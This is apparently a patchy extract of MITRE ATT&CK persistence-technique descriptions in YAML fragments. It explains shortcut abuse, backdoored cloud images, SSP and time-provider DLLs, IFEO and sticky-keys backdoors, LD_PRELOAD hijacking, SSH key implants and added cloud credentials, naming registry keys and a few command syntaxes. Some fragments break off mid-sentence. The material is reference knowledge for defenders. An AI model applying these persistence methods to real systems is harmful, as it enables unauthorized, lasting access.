        Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.

        Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.

        Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)

        A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)

        Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

        The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

      name: Hybrid Identity
      description: "Adversaries may patch, modify, or otherwise backdoor cloud authentication
        processes that are tied to on-premises user identities in order to bypass
        typical authentication mechanisms, access credentials, and enable persistent
        access to accounts.  \n\nMany organizations maintain hybrid user and device
        identities that are shared between on-premises and cloud-based environments.
        These can be maintained in a number of ways. For example, Microsoft Entra
        ID includes three options for synchronizing identities between Active Directory
        and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization
        (PHS), in which a privileged on-premises account synchronizes user password
        hashes between Active Directory and Entra ID, allowing authentication to Entra
        ID to take place entirely in the cloud \n* Pass Through Authentication (PTA),
        in which Entra ID authentication attempts are forwarded to an on-premises
        PTA agent, which validates the credentials against Active Directory \n* Active
        Directory Federation Services (AD FS), in which a trust relationship is established
        between Active Directory and Entra ID \n\nAD FS can also be used with other
        SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication
        process to AD FS and receive a token containing the hybrid users’ identity
        and privileges. \n\nBy modifying authentication processes tied to hybrid identities,
        an adversary may be able to establish persistent privileged access to cloud
        resources. For example, adversaries who compromise an on-premises server running
        a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService`
        process that authorizes all attempts to authenticate to Entra ID, as well
        as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation:
        AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary
        may edit the `Microsoft.IdentityServer.Servicehost` configuration file to
        load a malicious DLL that generates authentication tokens for any user with
        any set of claims, thereby bypassing multi-factor authentication and defined
        AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able
        to modify the hybrid identity authentication process from the cloud. For example,
        adversaries who compromise a Global Administrator account in an Entra ID tenant
        may be able to register a new PTA agent via the web console, similarly allowing
        them to harvest credentials and log into the Entra ID environment as any user.(Citation:
        Mandiant Azure AD Backdoors)"

        Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.

        Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.

        The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)

        The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.

        Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)

      description: |-
        Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)

        Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)

        Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)

      name: 'Hijack Execution Flow: Path Interception by Search Order Hijacking'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

        Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

        For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net user</code>. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)

        Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).

        Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

      description: |-
        Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

        Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)

        Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)

        Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)

        Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)

        Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)

      description: |-
        Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.

        Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where "command list" will be executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)

      name: 'Hijack Execution Flow: LD_PRELOAD'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)

        Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)

        Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.

        misuse visual studio) IDEs such as Visual Studio Code, IntelliJ IDEA, and
        Eclipse support extensions - software components that add features like code
        linting, auto-completion, task automation, or integration with tools like
        Git and Docker. A malicious extension can be installed through an extension
        marketplace (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001))
        or side-loaded directly into the IDE.(Citation: Abramovsky VSCode Security)(Citation:
        Lakshmanan Visual Studio Marketplace)   \n\nIn addition to installing malicious
        extensions, adversaries may also leverage benign ones. For example, adversaries
        may establish persistent SSH tunnels via the use of the VSCode Remote SSH
        extension (i.e., [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)).
        \ \n\nTrust is typically established through the installation process; once
        installed, the malicious extension is run every time that the IDE is launched.
        The extension can then be used to execute arbitrary code, establish a backdoor,
        mine cryptocurrency, or exfiltrate data.(Citation: ExtensionTotal VSCode Extensions

      description: "Adversaries may modify the SSH <code>authorized_keys</code> file
        to maintain persistence on a victim host. Linux distributions, macOS, and
        ESXi hypervisors commonly use key-based authentication to secure the authentication
        process of SSH sessions for remote management. The <code>authorized_keys</code>
        file in SSH specifies the SSH keys that can be used for logging into the user
        account for which the file is configured. This file is usually found in the
        user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>
        (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized
        Keys) Users may edit the system’s SSH config file to modify the directives
        `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure
        public key and RSA authentication are enabled, as well as modify the directive
        `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation:
        Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries
        may modify SSH <code>authorized_keys</code> files directly with scripts or
        shell commands to add their own adversary-supplied public keys. In cloud environments,
        adversaries may be able to modify the SSH authorized_keys file of a particular
        virtual machine via the command line interface or rest API. For example, by
        using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH
        keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google
        Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the
        authorized_keys file of a virtual machine via a PATCH request to the API.(Citation:
        Azure Update Virtual Machines) This ensures that an adversary possessing the
        corresponding private key may log in as an existing user via SSH.(Citation:
        Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead
        to privilege escalation where the virtual machine or instance has distinct
        permissions from the requesting user.\n\nWhere authorized_keys files are modified
        via cloud APIs or command line interfaces, an adversary may achieve privilege
        escalation on the target virtual machine if they add a key to a higher-privileged
        user. \n\nSSH keys can also be added to accounts on network devices, such
        as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)"

      description: |-
        Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.

        Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

      name: Executable Installer File Permissions Weakness
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

      name: 'Event Triggered Execution: Accessibility Features'
      description: |-
        Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>

        on a compromised system. Microsoft Office contains templates that are part
        of common Office applications and are used to customize styles. The base templates
        within the application are used each time an application starts. (Citation:
        Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications
        (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base
        template and used to execute code when the respective Office application starts
        in order to obtain persistence. Examples for both Word and Excel have been
        discovered and published. By default, Word has a Normal.dotm template created
        that can be modified to include a malicious macro. Excel does not have a template
        file created by default, but one can be added that will automatically be loaded.(Citation:
        enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates
        may also be stored and pulled from remote locations.(Citation: GlobalDotName

        may also change the location of the base template to point to their own by
        hijacking the application's search order, e.g. Word 2016 will first look for
        Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>,
        or by modifying the GlobalDotName registry key. By modifying the GlobalDotName
        registry key an adversary can specify an arbitrary location, file name, and
        file extension to use for the template that will be loaded on application
        startup. To abuse GlobalDotName, adversaries may first need to register the
        template as a trusted document or place it in a trusted location.(Citation:

        Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.

        MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)

        Similarly, an adversary with existing access to a network may register a device or a virtual machine to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537)(Citation: Expel Atlas Lion 2025)

        Devices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)

        Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.

        Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.

        Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.

        Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)

      description: |-
        Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

        This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

      name: 'Account Manipulation: Additional Cloud Credentials'
      description: "Adversaries may add adversary-controlled credentials to a cloud
        account to maintain persistent access to victim accounts and instances within
        the environment.\n\nFor example, adversaries may add credentials for Service
        Principals and Applications in addition to existing legitimate credentials
        in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation:
        Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials
        include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer
        Guidance) With sufficient permissions, there are a variety of ways to add
        credentials including the Azure Portal, Azure command line interface, and
        Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn
        infrastructure-as-a-service (IaaS) environments, after gaining access through
        [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries
        may generate or import their own SSH keys using either the <code>CreateKeyPair</code>
        or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login
        ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows
        persistent access to instances within the cloud environment without further
        usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation:
        Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code>
        API in AWS or the <code>gcloud iam service-accounts keys create</code> command
        in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code>
        API in AWS to add a password that can be used to log into the AWS Management
        Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation:
        Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024)
        If the target account has different permissions from the requesting account,
        the adversary may also be able to escalate their privileges in the environment
        (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation:
        Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel
        2.0) For example, in Entra ID environments, an adversary with the Application
        Administrator role can add a new set of credentials to their application's
        service principal. In doing so the adversary would be able to access the service
        principal’s roles and permissions, which may be different from those of the
        Application Administrator.(Citation: SpecterOps Azure Privilege Escalation)
        \n\nIn AWS environments, adversaries with the appropriate permissions may
        also use the `sts:GetFederationToken` API call to create a temporary set of
        credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606)
        tied to the permissions of the original user account. These temporary credentials
        may remain valid for the duration of their lifetime even if the original account’s
        API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation
        Persistence)\n\nIn Entra ID environments with the app password feature enabled,
        adversaries may be able to add an app password to a user account.(Citation:
        Mandiant APT42 Operations 2024) As app passwords are intended to be used with
        legacy devices that do not support multi-factor authentication (MFA), adding
        an app password can allow an adversary to bypass MFA requirements. Additionally,
        app passwords may remain valid even if the user’s primary password is reset.(Citation:
        Microsoft Entra ID App Passwords)"

      description: |-
        Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)

        Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)

        WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.

      name: Compromise Host Software Binary
      description: |-
        Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.

        Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation: Google Cloud Mandiant UNC3886 2024)

